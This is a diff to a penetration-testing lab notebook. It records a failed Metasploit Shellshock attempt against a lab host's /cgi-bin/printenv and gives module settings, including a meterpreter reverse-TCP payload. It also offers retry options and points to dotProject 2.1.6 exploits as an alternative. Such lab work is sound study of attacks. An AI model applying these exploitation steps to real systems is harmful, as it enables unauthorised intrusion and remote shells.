@@ -251,6 +251,20 @@ gobuster dir -u "http://$RHOST_102/cgi-bin/" -w /usr/share/wordlists/dirb/common
 
 Keep **`/dotproject/`** (**2.1.6**) as the **parallel** app lane; cross-check Nikto paths with **`searchsploit dotproject 2.1.6`** (**`vw_files.php`** overlaps some historic RFI write-ups — still **`searchsploit -x`** first).
 
+### Exploitation attempt — Metasploit **`exploit/multi/http/apache_mod_cgi_bash_env_exec`** (`printenv`)
+
+![MSF Shellshock module — check reports not exploitable at /cgi-bin/printenv](../Screenshots/exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png)
+
+| Field | Value |
+|-------|--------|
+| **Module** | `exploit/multi/http/apache_mod_cgi_bash_env_exec` |
+| **Settings (typical)** | `set RHOSTS 10.20.160.102` · `set RPORT 80` · **`set TARGETURI /cgi-bin/printenv`** · payload e.g. **`linux/x86/meterpreter/reverse_tcp`** + `LHOST` / `LPORT` |
+| **Result** | **`check`** → **The target is not exploitable** at this URI (screenshot evidence). |
+
+**`RPATH` ≠ CGI path** — In this module, **`RPATH`** means **target filesystem prefix for CmdStager** (default **`/bin`**, used so commands invoke **`/bin/chmod`**, etc.). The **web path to the CGI script** is only **`TARGETURI`**. Do **not** set **`RPATH`** to **`/cgi-bin/printenv`**.
+
+**If `check` fails but Nikto “flagged” Shellshock:** Treat Nikto as a **hint**, not proof — **patched bash**, **header not passed** into bash via that CGI, or **script behavior** can block the module’s marker test. **Optional retries (lab policy):** **`TARGETURI /cgi-bin/test-cgi`**, **`set CVE CVE-2014-6278`**, alternate **`HEADER`** (**`Referer`**, **`Cookie`**) per module **`show options`**. If still negative, **prioritize dotProject 2.1.6** and other findings over Shellshock.
+
 ### Recon — `nmap --script http-shellshock` (default test URI)
 
 ![nmap http-shellshock uri=/cgi-bin/test.cgi — 80/443 open, 8080 filtered, no script finding line](../Screenshots/recon_nmap_http_shellshock_test_cgi_tm6_afrocha.png)
@@ -280,7 +294,7 @@ Keep **`/dotproject/`** (**2.1.6**) as the **parallel** app lane; cross-check Ni
 
 | Topic | What to set | Your `.102` status |
 |--------|-------------|-------------------|
-| **Metasploit `apache_mod_cgi_bash_env_exec` (Shellshock)** | **`TARGETURI`** = path to a **single CGI executable** (e.g. `/cgi-bin/foo.cgi`). Not PHP under mod_php. | **Candidates:** Nikto flagged **`/cgi-bin/printenv`** and **`/cgi-bin/test-cgi`** — **validate**, then try **`TARGETURI`** to the one that behaves as CGI. |
+| **Metasploit `apache_mod_cgi_bash_env_exec` (Shellshock)** | **`TARGETURI`** = **CGI URL path**; **`RPATH`** = **`/bin`**-style **CmdStager prefix**, not `/cgi-bin/…`. | **`check` failed** at **`/cgi-bin/printenv`** — try **`test-cgi`** / **`CVE-2014-6278`** / other **HEADER**, or **drop Shellshock** and drive **dotProject 2.1.6**. |
 | **Metasploit PHP / webapp modules** | Usually **`TARGETURI`** = **web root of the app**, often **`/dotproject/`** (trailing slash per module docs). Some modules add options for a vulnerable script name. | **Yes — use `/dotproject/`** as the **base path** once you pick a module whose prerequisites match your fingerprinted **dotProject** version. |
 | **Exploit-DB / `searchsploit` PHP scripts** | Often a **full URL** or **path under the app** passed on the command line; paths in the DB (e.g. `modules/public/calendar.php`) are **relative to the dotProject folder**. | Full URL pattern: **`http://10.20.160.102/dotproject/<path-from-exploit>`** — confirm the file exists with **`curl -I`** before running anything. |
 
